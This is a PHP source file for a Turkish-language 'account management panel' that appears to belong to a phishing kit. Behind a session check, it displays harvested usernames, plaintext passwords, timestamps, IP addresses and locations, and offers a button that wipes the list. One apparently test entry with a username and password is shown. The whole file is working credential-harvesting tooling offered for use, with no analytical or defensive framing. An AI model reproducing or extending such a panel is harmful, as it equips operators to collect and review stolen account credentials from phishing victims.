
<?php
 require_once('ayarlar.php');
session_start();
if(!isset($_SESSION[$adminSifre])){
    header("Refresh: 0; url=admin.php"); 
    exit();
}



?>

<input type="hidden" id="react" value="<?php  echo filemtime($phpYolu); ?>">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<script src="https://code.jquery.com/jquery-3.6.0.js" integrity="sha256-H+K7U5CnXl1h5ywQfKtSj8PCmoN9aaq30gDh27Xc0jk=" crossorigin="anonymous"></script>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-eOJMYsd53ii+scO/bJGFsiCZc+5NDVN2yr8+0RDqr0Ql0h+rP48ckxlpbzKgwra6" crossorigin="anonymous">
<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.2/css/all.css">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Ubuntu&display=swap" rel="stylesheet">
<nav style="background:white;" aria-label="breadcrumb">
  
    <center><img style="margin-top:20px; margin-left:0%;" src="data:image/png;base64,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"  width="150">
    
</center>

  
  <center><b style="font-size:20px; font-family:Ubuntu,sans-serif;"><i style="" class="fas fa-user-cog"></i> Hesap Yönetim Paneli</b></center>
</nav>
<script type="text/javascript">
function asagiKaydir()
  {
  window.scrollBy(100,90000)
  }
</script>
<div style="background:white; margin-top:10px;" class="d-grid gap-2">
  <center><button onclick=\'var txt;
var r = confirm("Silmek İstediğinize eminmisiniz!");
if (r == true) {
				window.location.href="txt0.php";
} else {
  txt = "You pressed Cancel!";
}\' class="btn btn-danger" style="width:150px;" type="button"><i class="fas fa-trash-alt"></i> Listeyi Sıfırla</button>
	
	<button  onclick="asagiKaydir()" class="btn btn-primary" type="button"><i class="fas fa-arrow-down"></i> Listenin Sonuna Git</button>
	
	
 
</div>
 
<hr size="4px"> 
<font color='red'>Kullanıcı Adı: </font><font color='black'>soulofcx</font><br>
<font color='red'>Password: </font><font color='black'>deneme</font><br>
<font color='red'>Tarih: </font><font color='black'>27-02-2022 22:29:20</font><br>
<font color='red'>İp Adresi: </font><font color='black'>::1</font><br>
    <font color='red'>Konum: </font><font color='black'></font><br>